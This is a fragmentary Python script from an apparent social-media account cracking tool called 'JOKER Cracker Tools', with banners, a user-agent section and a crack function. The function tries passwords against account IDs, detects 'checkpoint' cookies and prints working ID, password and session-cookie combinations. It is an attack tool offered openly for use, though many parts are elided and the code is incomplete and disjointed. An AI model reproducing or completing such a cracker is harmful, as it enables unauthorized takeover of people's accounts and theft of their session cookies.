...
os.system('espeak -a 300 " Welcome,   to,  JOKER,  Cracker,  Tools"')
dump, sandi, metode = [], [], []
tetel, opsi, proxy = [], [], []
...
print(('—'*25)+'\n• DeCoDe By @JOKER404m •\n'+('—'*25))
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mWELCOME FOR TOOL CAPTIN")
time.sleep(2)
print(('—'*25)+'\n• DeCoDe By @JOKER404 •\n'+('—'*25))
#------------------[ JOKER ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \033[1;31m[JOKER-B-Api][\033[2;32m{loop}\033[1;31m{P}/{h}{len(id)}{P}]\033[2;32m [{ok}]\x1b[38;5;208m{P} \033[1;34m "),
    sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
               ...
               # print ('\x1b[36m| ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅|')
                #print(f'\r\033[0;93m[\33[1;96mNAKRETAUA[😅]\33[1;93m]  {idf}  {pw} ')
              #  print ('\x1b[36m|________________|')
              ...
              #  print ('\x1b[32m| ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅|')
                print(f'\r\x1b[32[JOKER-OK]\033[1;32m   {idf} | \033[1;32m{pw} | \033[1;32m{kuki}')
               # print ('\x1b[32m|________________|')
